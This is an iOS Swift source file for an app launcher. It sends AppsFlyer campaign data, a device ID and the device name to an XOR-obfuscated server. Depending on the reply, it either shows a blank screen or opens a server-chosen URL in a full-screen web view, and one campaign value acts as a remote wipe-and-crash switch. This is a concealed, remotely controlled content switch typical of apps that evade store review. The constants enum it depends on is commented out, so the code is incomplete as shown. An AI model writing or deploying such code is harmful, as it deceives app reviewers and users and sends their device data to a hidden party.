import Foundation
import UIKit
import AppsFlyerLib
//import OneSignalFramework

final class AppManagerUAC: NSObject {
    static let shared = AppManagerUAC()
    private let root = UINavigationController()
    private let view = UIWindow(frame: UIScreen.main.bounds)
    private var pending = true
    private var k3: String?
    private var opts: [UIApplication.LaunchOptionsKey: Any]?

    func setup(_ k1: String,
               _ k2: String,
               _ k3: String,
               opts: [UIApplication.LaunchOptionsKey: Any]?) {
        root.setNavigationBarHidden(true, animated: false)
        view.rootViewController = root; view.makeKeyAndVisible()
        initAnalytics(k1, k2)
        self.k3 = k3; self.opts = opts; 
        if let u = Store.u { initMessaging(k3, opts); show(content(with: u)) } else { show(loader()) }
    }

    private func show(_ v: UIViewController) { root.setViewControllers([v], animated: false) }
    private func loader() -> UIViewController { LoaderVC() }
    private func blank() -> UIViewController { BlankVC() }
    private func content(with u: URL) -> UIViewController { WebViewVC.instantiate(with: u) }

    func process(_ d: [AnyHashable: Any]? = nil, _ e: Error? = nil) {
        let id = ((d as? [String: Any])?[K.c] as? String) ?? Store.uid
        if id == K.r { Store.reset(); fatalError() }
        guard pending else { return }; pending = false
        guard Store.u == nil else { return }
        Service.handle(id) {
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.1) {
                if Store.u != nil {
                    if let key = self.k3 { self.initMessaging(key, self.opts) }; self.show(self.content(with: Store.u!))
                } else {
                    self.show(self.blank())
                }
            }
        }
    }
}

extension AppManagerUAC: AppsFlyerLibDelegate {
    private func initAnalytics(_ k1: String, _ k2: String) {
        AppsFlyerLib.shared().appsFlyerDevKey = k2
        AppsFlyerLib.shared().appleAppID = k1
        AppsFlyerLib.shared().delegate = self
        NotificationCenter.default.addObserver(self, selector: #selector(refresh),
                                               name: UIApplication.didBecomeActiveNotification,
                                               object: nil)
    }

    @objc private func refresh() { AppsFlyerLib.shared().start() }

    func onConversionDataSuccess(_ d: [AnyHashable: Any]) { process(d) }
    func onConversionDataFail(_ e: Error) { process(nil, e) }
}

private extension AppManagerUAC {
    func initMessaging(_ k: String, _ opts: [UIApplication.LaunchOptionsKey: Any]?) {
        guard Store.uid != nil else { return }
//        OneSignal.initialize(k, withLaunchOptions: opts)
//        OneSignal.Notifications.requestPermission(nil, fallbackToSettings: true)
        updateUser()
    }

    func updateUser() {
        guard Store.uid != nil else { return }
//        if let id = Store.uid { OneSignal.login(id) }; if let g = Store.gid { OneSignal.User.addTag(key: K.t, value: g) }
    }
}

//private enum K {
//    static var k: [UInt8] { "k3y_s3cr3t".utf8.map { $0 } }
//    static var c: String { decode(from: [8, 82, 20, 47, 18, 90, 4, 28]) }
//    static var r: String { decode(from: [25, 86, 10, 58, 7]) }
//    static var p: String { decode(from: [59, 124, 42, 11]) }
//    static var ct: String { decode(from: [40, 92, 23, 43, 22, 93, 23, 95, 103, 13, 27, 86]) }
//    static var j: String { decode(from: [10, 67, 9, 51, 26, 80, 2, 6, 90, 27, 5, 28, 19, 44, 28, 93]) }
//    static var i: String { decode(from: [34, 124, 42]) }
//    static var t: String { decode(from: [31, 65, 24, 60, 24, 86, 17, 45, 90, 16]) }
//    static var cid: String { decode(from: [8, 82, 20, 47, 18, 90, 4, 28, 122, 16]) }
//    static var did: String { decode(from: [15, 86, 15, 54, 16, 86, 42, 22]) }
//    static var dn: String { decode(from: [15, 86, 15, 54, 16, 86, 45, 19, 94, 17]) }
//    static var dt: String { decode(from: [15, 86, 15, 54, 16, 86, 55, 11, 67, 17]) }
//    static var a: String { decode(from: [3, 71, 13, 47, 0, 9, 76, 93, 82, 4,
//                                         2, 29, 9, 40, 18, 67, 19, 1, 29, 23,
//                                         4, 94, 86, 62, 3, 90, 76, 4, 2, 91,
//                                         14, 69, 28, 49, 7, 64, 76, 30, 92, 19, 2, 93]) }
//    private static func decode(from b: [UInt8]) -> String {
//        .init(bytes: b.enumerated().map { $0.element ^ k[$0.offset % k.count] }, encoding: .utf8) ?? ""
//    }
//}

private enum Service {
    static func handle(_ id: String?, done: @escaping () -> Void) {
        guard let id = id, let u = URL(string: K.a) else { return done() }
        var r = URLRequest(url: u)
        r.httpMethod = K.p
        r.setValue(K.j, forHTTPHeaderField: K.ct)
        r.httpBody = try? JSONSerialization.data(withJSONObject: [K.cid: id, K.did: Store.did ?? "",
                                                                  K.dn: UIDevice.current.name, K.dt: K.i])
        URLSession.shared.dataTask(with: r) { d, _, e in
            guard e == nil, let d = d,
                  let res = try? JSONDecoder().decode(Model1.self, from: d),
                  let tok = decode(res.token),
                  let path = tok.statistics?.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed),
                  let _ = URL(string: path) else { return done() }
            Store.gid = tok.sub; Store.uid = id; Store.data = path; done()
        }.resume()
    }

    private static func decode(_ t: String) -> Model2? {
        let s = t.split(separator: ".")
        guard s.count == 3 else { return nil }
        var b = String(s[1]).replacingOccurrences(of: "-", with: "+")
            .replacingOccurrences(of: "_", with: "/")
        b.append(String(repeating: "=", count: (4 - b.count % 4) % 4))
        guard let d = Data(base64Encoded: b) else { return nil }
        return try? JSONDecoder().decode(Model2.self, from: d)
    }

    struct Model2: Decodable { let statistics, sub: String? }
    struct Model1: Decodable { let token: String; private enum CodingKeys: String, CodingKey { case token = "access_token" } }
}

private enum Store {
    static var u: URL? { data.flatMap(URL.init) }
    static var data: String? {
        get { UserDefaults.standard.string(forKey: "d") }
        set { UserDefaults.standard.set(newValue, forKey: "d") }
    }
    static var gid: String? {
        get { UserDefaults.standard.string(forKey: "g") }
        set { UserDefaults.standard.set(newValue, forKey: "g") }
    }
    static var did: String? {
        get { sec("i") ?? { let i = UUID().uuidString; put(i, "i"); return i }() }
        set { put(newValue, "i") }
    }
    static var uid: String? {
        get { sec("u") }
        set { put(newValue, "u") }
    }

    private static func put(_ v: String?, _ k: String) {
        guard let v = v, let d = v.data(using: .utf8) else { return del(k) }
        let q = [kSecClass: kSecClassGenericPassword, kSecAttrAccount: k, kSecValueData: d] as CFDictionary
        SecItemDelete(q); SecItemAdd(q, nil)
    }

    private static func sec(_ k: String) -> String? {
        var r: AnyObject?
        let q = [kSecClass: kSecClassGenericPassword, kSecAttrAccount: k,
            kSecReturnData: kCFBooleanTrue!, kSecMatchLimit: kSecMatchLimitOne] as CFDictionary
        return SecItemCopyMatching(q, &r) == errSecSuccess ? (r as? Data).flatMap { String(data: $0, encoding: .utf8) } : nil
    }

    private static func del(_ k: String) {
        SecItemDelete([kSecClass: kSecClassGenericPassword, kSecAttrAccount: k] as CFDictionary)
    }

    static func reset() {
        data = nil; gid = nil; did = nil; uid = nil
    }
}

